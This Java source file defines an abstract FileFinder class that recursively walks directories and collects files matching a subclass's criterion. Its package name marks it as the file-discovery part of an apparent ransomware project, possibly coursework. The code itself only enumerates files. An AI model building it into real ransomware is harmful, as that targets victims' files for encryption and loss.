package fr.esgi.ransomware.file_reader;

import java.io.File;
import java.io.FileFilter;
import java.util.ArrayList;
import java.util.List;

public abstract class FileFinder implements FileFilter {

    private final List<File> foundFiles;

    public FileFinder() {
        this.foundFiles = new ArrayList<>();
    }


    @Override
    public boolean accept(File pathname) {
        if (pathname.isDirectory()) return true;

        return isFileMatch(pathname);
    }

    public List<File> findFiles(File... filesArray) {
        for (File file : filesArray) {
            if (file.isDirectory()) {
                findFiles(file.listFiles(this));
            } else if (isFileMatch(file)) {
                foundFiles.add(file);
            }
        }
        return foundFiles;
    }

    public abstract boolean isFileMatch(File file);
}
